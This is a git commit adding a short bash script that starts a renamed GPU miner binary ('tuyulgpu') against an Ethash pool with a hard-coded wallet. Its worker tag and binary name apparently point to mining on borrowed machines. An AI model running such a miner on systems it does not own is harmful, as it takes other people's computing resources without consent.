302c6b3ae3ab9f94c05a7356a625e4e9072eb0bb
noe3257 <86428474+noe3257@users.noreply.github.com>
2021-06-24 19:59:28 +0300

    Add files via upload

---
+++ gpu.sh
@@ -0,0 +1,7 @@
+#!/bin/bash
+POOL=ethash.unmineable.com:3333
+WALLET=UNI:0x734c50356ef7e511c3baa0bd35d3a6385f41f6a7.TES
+WORKER=$(echo $(shuf -i 1000-9999 -n 1)-GPU-PINJEM)
+
+chmod +x tuyulgpu
+./tuyulgpu --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
